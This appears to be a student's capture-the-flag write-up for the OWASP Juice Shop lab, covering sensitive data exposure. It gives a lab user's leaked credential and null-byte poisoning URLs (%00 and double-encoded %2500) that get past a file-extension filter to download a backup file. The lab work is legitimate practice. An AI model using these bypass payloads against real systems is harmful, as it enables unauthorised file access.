# AH! Don't look! 

OWASP TOP 10 - Sensitive Data Exposure

## Practical

### Confidential Document

![86f499de06e0d01d849b8d62986abafe.png](_resources/a5dd66360f764b6bae25be12085ae8f5.png)

http://10.10.46.205/ftp/legal.md

![a365945555138030e114de230dc4925c.png](_resources/91904113a7604edcac6304d5d9923646.png)

###  Login MC SafeSearch

`mc.safesearch@juice-sh.op:Mr. N00dles`

![b6c02b2aebc1e19e625e9b1ba179b81d.png](_resources/3eae80a2adc344ee897f396a0e0a7b72.png)

### Bypass file restriction with null byte

```
http://10.10.46.205/ftp/package.json.bak
```

![e0ad1276c97f300efefa1d320830217d.png](_resources/e003ed98451d4bcfbc989e4ab248535a.png)

Null-byte poisoning
```
http://10.10.46.205/ftp/package.json.bak%00.md
```

![25b5b856f88f1f7cc2b9cca5149c0119.png](_resources/f147d30851e54a4f99e374a550dffc81.png)

Null-byte poisoining with superflous url encode

```
10.10.46.205/ftp/package.json.bak%2500.md
```

`%25` = `%`  
`%00` = `null`
`%2500` => `%00` => `null` (terminated)  

![fd7af6e8caaed6a4cef6d41be77f0fe0.png](_resources/2be91c0b7df74162992c2d52c4afa9ab.png)


[Common obstacles to exploiting file path traversal vulnerabilities](undefined)


